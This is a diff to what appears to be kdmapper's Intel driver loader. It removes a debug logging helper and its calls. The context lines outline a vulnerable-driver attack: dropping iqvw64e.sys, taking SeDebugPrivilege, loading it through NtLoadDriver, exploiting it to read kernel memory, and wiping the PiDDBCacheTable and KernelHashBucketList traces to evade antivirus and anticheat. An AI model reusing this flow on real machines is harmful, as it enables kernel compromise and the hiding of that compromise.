@@ -13,20 +13,6 @@
 
 
  
-
-static void file_log(const char* msg) {
-    char path[MAX_PATH]{};
-    GetModuleFileNameA(nullptr, path, MAX_PATH);
-    std::string p(path);
-    auto pos = p.find_last_of("\\/");
-    if (pos != std::string::npos) p = p.substr(0, pos + 1);
-    p += "mapper_log.txt";
-    std::ofstream f(p, std::ios::app);
-    if (!f) return;
-    SYSTEMTIME st{}; GetLocalTime(&st);
-    char ts[32]; sprintf_s(ts, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
-    f << ts << msg << std::endl;
-}
 typedef struct _COPY_MEMORY_BUFFER_INFO
 {
 	uint64_t case_number;
@@ -135,12 +121,10 @@ bool intel_driver::AcquireDebugPrivilege() {
 }
 
 bool intel_driver::Load() {
-	file_log("intel_driver::Load enter");
 	srand((unsigned)time(NULL) * GetCurrentThreadId());
 
 	
 	if (intel_driver::IsRunning()) {
-		file_log("FAIL: Device Nal already in use");
 		Log(L"[-] \\Device\\Nal is already in use." << std::endl);
 		Log(L"[-] This means that there is a intel driver already loaded or another instance of kdmapper is running or kdmapper crashed and didn't unload the previous driver." << std::endl);
 		Log(L"[-] If you are sure that there is no other instance of kdmapper running, you can try to restart your computer to fix this issue." << std::endl);
@@ -152,7 +136,6 @@ bool intel_driver::Load() {
 
 	std::wstring driver_path = GetDriverPath();
 	if (driver_path.empty()) {
-		file_log("FAIL: TEMP folder empty");
 		Log(L"[-] Can't find TEMP folder" << std::endl);
 		return false;
 	}
@@ -160,20 +143,17 @@ bool intel_driver::Load() {
 	_wremove(driver_path.c_str());
 
 	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
-		file_log("FAIL: CreateFileFromMemory vulnerable driver");
 		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
 		return false;
 	}
 
 	if (!AcquireDebugPrivilege()) {
-		file_log("FAIL: SeDebugPrivilege");
 		Log(L"[-] Failed to acquire SeDebugPrivilege" << std::endl);
 		_wremove(driver_path.c_str());
 		return false;
 	}
 
 	if (!service::RegisterAndStart(driver_path, GetDriverNameW())) {
-		file_log("FAIL: RegisterAndStart (NtLoadDriver) - check VulnerableDriverBlocklist / admin / AV");
 		Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
 		_wremove(driver_path.c_str());
 		return false;
@@ -183,7 +163,6 @@ bool intel_driver::Load() {
 
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
 	{
-		file_log("FAIL: CreateFile \\\\.\\Nal INVALID_HANDLE");
 		Log(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
 		intel_driver::Unload();
 		return false;
@@ -191,7 +170,6 @@ bool intel_driver::Load() {
 
 	ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
 	if (ntoskrnlAddr == 0) {
-		file_log("FAIL: ntoskrnl.exe base 0");
 		Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
 		intel_driver::Unload();
 		return false;
@@ -200,21 +178,18 @@ bool intel_driver::Load() {
 	
 	IMAGE_DOS_HEADER dosHeader = { 0 };
 	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
-		file_log("FAIL: intel ReadMemory/exploit blocked (AV/AC)");
 		Log(L"[-] Can't exploit intel driver, is there any antivirus or anticheat running?" << std::endl);
 		intel_driver::Unload();
 		return false;
 	}
 
 	if (!intel_driver::ClearPiDDBCacheTable()) {
-		file_log("FAIL: ClearPiDDBCacheTable");
 		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
 		intel_driver::Unload();
 		return false;
 	}
 
 	if (!intel_driver::ClearKernelHashBucketList()) {
-		file_log("FAIL: ClearKernelHashBucketList");
 		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
 		intel_driver::Unload();
 		return false;
@@ -232,7 +207,6 @@ bool intel_driver::Load() {
 		return false;
 	}
 
-	file_log("intel_driver::Load SUCCESS");
 	return true;
 }
 
